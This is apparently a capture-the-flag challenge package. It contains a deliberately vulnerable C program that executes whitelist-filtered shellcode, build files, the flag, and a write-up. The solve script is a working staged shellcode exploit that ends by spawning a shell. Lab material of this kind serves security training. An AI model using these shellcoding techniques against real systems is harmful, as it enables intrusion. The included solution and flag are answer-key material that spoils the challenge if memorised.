{
    "contrived-shellcode.c": "#include <sys/mman.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nunsigned char whitelist[] = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0d\\x0e\\x0f\";\n\nvoid check(unsigned char* code, int len) {\n    for (int i = 0; i < len; i++) {\n        if (memchr(whitelist, code[i], sizeof(whitelist)) == NULL) {\n            printf(\"Oops, shellcode contains blacklisted character %02X at offset %d.\\n\", code[i], i);\n            exit(-1);\n        }\n    }\n}\n\nint main() {\n    unsigned char* code = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\n    int len = read(0, code, 0x100);\n\n    if (len > 0) {\n        if (code[len - 1] == '\\n') {\n            code[len - 1] = '\\0';\n        }\n        check(code, len); \n        ((void (*)())(code))();\n    }\n}\n",
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "flag.txt": "gigem{Sh3llc0d1ng_1s_FuN}\n",
    "insns.py": "from capstone import *\nfrom collections import defaultdict\n\nallowed = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15]\ninsns = defaultdict(set)\nmd = Cs(CS_ARCH_X86, CS_MODE_64)\ncode = bytearray([0, 0, 0, 0, 0])\nfor a in allowed:\n    code[0] = a\n    for b in allowed:\n        code[1] = b\n        for c in allowed:\n            code[2] = c\n            for d in allowed:\n                code[3] = d\n                for e in allowed:\n                    code[4] = e\n                    for _, _, mnemonic, op_str in md.disasm_lite(code, 0):\n                        if \"eax, 0x\" not in op_str:\n                            insns[mnemonic].add(op_str)\n                        break\n\nblacklist = [\"pi2fd\", \"prefetchw\", \"sgdt\", \"str\", \"femms\", \"invd\", \"ud2\", \"sidt\", \"pi2fw\", \"sldt\", \"lar\", \"lsl\", \"clts\", \"sysret\", \"wbinvd\", \"or\"]\nfor b in blacklist:\n    del insns[b]\n\nfor mn, ops in insns.items():\n    for op in ops:\n        print(mn, op)\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nNAME := contrived-shellcode\nPORT := 7000\nall: $(NAME)\n\nclean: .PHONY\n\tdocker rm -f $(NAME)\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c\n\n.PHONY:\n\n",
    "README.md": "# Contrived Shellcode\n\nAuthor: `anomie`\n\nThere's a 0% chance this has any real world application, but sometimes it's just fun to test your skills.\n\n## Dev Notes\nHost the remote with `make run`, it is running by default on port 7000.\n\nGiven files are the binary `contrived-shellcode` and the source code `contrived-shellcode.c`. Acquire them with `make dist`\n\n## Solution\nUsing [capstone](https://www.capstone-engine.org/lang_python.html), we can check which x86-64 instructions fit the provided constraints. A simple Python script that finds valid instructions via brute force can be found in `insns.py`. Note that 0x0a (newline) is _not_ in the whitelist.\n\nAfter digging through the list of valid instructions, some of the most interesting ones are:\n```\nadd al, <valid immediate>\nadd byte ptr [rdx + rax], cl\n```\n\nAfter examining the disassembly of the program and running it in `gdb`, some interesting register values at the beginning of our shellcode's execution are:\n```\nrdx = <starting address of shellcode buffer>\nrax = 0\nrcx = 0x10\n```\n\nCombined with the previous x86-64 instructions, we can create a write primitive with 2 constraints:\n1. The target address must be within 256 bytes of the start of the shellcode buffer.\n2. The target byte must not be equal to 0x0a (mod 0x10).\n\nUsing this write primitive, we can create and execute instructions outside the initial whitelist at runtime. Here's what the first stage looks like:\n1. Increment `rax` until it points a decent amount down the buffer. The second stage will start here.\n2. Repeatedly spam `add byte ptr [rdx + rax], cl` to construct the most-significant nibble. The least-significant nibble should be set in advance during the initial read.\n3. Advance `rax` to the next write target.\n4. Repeat from #2 until the second stage is in memory.\n\nThe initial value of `rax` should be chosen such that the second stage is immediately after the first stage. Now, it's just a matter of crafting a second stage that fits the constraints of our write primitive. \n\nTo ensure our second stage requires minimal effort from the first stage, we can have it read in a third stage with the `read()` syscall. \n\n```x86asm\nb8 00 00 00 00       mov    eax, 0x0           ; rax = 0 (syscall number)\nbf 00 00 00 00       mov    edi, 0x0           ; rdi = 0 (file descriptor is STDIN)\n52                   push   rdx \n5e                   pop    rsi                ; rsi = <starting address of shellcode buffer>\n81 e2 00 00 0f 00    and    edx, 0xf0000       ; rdx = <small-enough value to ensure the syscall succeeds>\n0f 05                syscall\n```\n\nWhile this payload for the second stage is sub-par in terms of size, there are only 6 bytes with nibbles that we need to increment; the rest can be set in advance, which helps cut down on the number of bytes required for the first stage.\n\nFor the final payload that gets fed in via `read()`, we can send in off-the-shelf shellcode that drops a shell. However, before sending the final payload, we need to send padding equal to the sum of the lengths of the first two stages. This ensures that execution of the final payload will happen immediately after the second stage returns from the syscall.\n\nThe final size for the initial input is 220 bytes. See `solve.py` for details.\n\nFlag: `gigem{Sh3llc0d1ng_1s_FuN}`\n",
    "solve.py": "from pwn import *\nfrom pathlib import Path\n\ncontext.binary = ELF(\"contrived-shellcode\")\n\nstage2 = asm(\"\"\"\nmov eax, 0\nmov edi, 0\npush rdx\npop rsi\nand edx, 0x000f0000\nsyscall\n\"\"\")\n\nrcx = 0x10\nadds = []\njumps = []\nimg = []\nfor i, b in enumerate(stage2):\n    q, r = divmod(b, rcx)\n    img.append(r)\n    if q != 0:\n        jump = 1\n        for j, b in enumerate(stage2[i + 1:]):\n            if b // rcx != 0:\n                jump += j\n                break\n        jumps.append(jump)\n        adds.append(q)\n\ninit = \"\"\nfor i, (add, jump) in enumerate(zip(adds, jumps)):\n    init += \"add byte ptr [rdx + rax], cl\\n\" * add\n    # omit the last adjustment to rax because we don't use it\n    if i < len(adds) - 1:\n        init += f\"add al, {jump}\\n\"\n\ndef set_al(n):\n    q, r = divmod(n, 0x0f)\n    return q * \"add al, 0x0f\\n\" + f\"add al, {r}\\n\"\n\n# determined by trial and error to eliminate padding nops\ndestination = 0x0f * 0x0e - (2 * 5)\npayload = asm(set_al(destination) + init)\nassert len(payload) <= destination\npad = destination - len(payload)\nassert pad % 2 == 0\npayload += (pad // 2) * b\"\\x0c\\x00\"\npayload += bytes(img)\nassert b\"\\n\" not in payload\n\np = remote(\"localhost\", 7000)\np.sendline(payload)\np.sendline(b\"\\x90\" * len(payload) + asm(shellcraft.sh()))\nprint(f\"initial input is {len(payload)} bytes\")\np.interactive()\n",
    "category": "pwn"
}